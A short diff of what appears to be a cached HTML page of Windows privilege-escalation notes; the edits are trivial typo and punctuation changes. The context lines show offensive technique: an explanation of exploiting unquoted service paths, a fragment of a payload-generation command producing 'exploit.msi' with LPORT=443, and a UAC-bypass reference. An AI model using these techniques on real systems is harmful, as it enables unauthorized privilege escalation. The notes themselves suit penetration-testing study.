@@ -1,4 +1,4 @@
-I"à0<h2 id="system-enumeration">System enumeration</h2>
+I"ß0<h2 id="system-enumeration">System enumeration</h2>
 
 <p><strong>Which OS the target is running? Are there any hot fixes installed?</strong></p>
 
@@ -121,7 +121,7 @@ sc start [service name]
         <h3 class="panel-title">Info:</h3>
       </div>
       <div class="panel-body">
-    If an executable is enclosed in quote tags "" Windows will know where to find it when it attempts to execute it. However, if the executable is not enclosed in quote tags and the path contains one or more spaces; Windows will handle the space as a break and pass the rest of the service path as an argument. If we have write permissions to any of the folders containing spaces, we can exploit the unquoted service path vulnerability.
+    If an executable is enclosed in quote tags "";Windows will know where to find it when it attempts to execute it. However, if the executable is not enclosed in quote tags and the path contains one or more spaces; Windows will handle the space as a break and pass the rest of the service path as an argument. If we have write permissions to any of the folders containing spaces, we can exploit the unquoted service path vulnerability.
       </div>
     </div>
 
@@ -216,7 +216,7 @@ LPORT=443 -f msi -o exploit.msi
 <h3 id="references--further-readings">References &amp; Further readings</h3>
 
 <ul>
-  <li><a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation</a>*</li>
+  <li><a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation</a></li>
   <li><a href="https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/">https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/</a></li>
 </ul>
 :ET
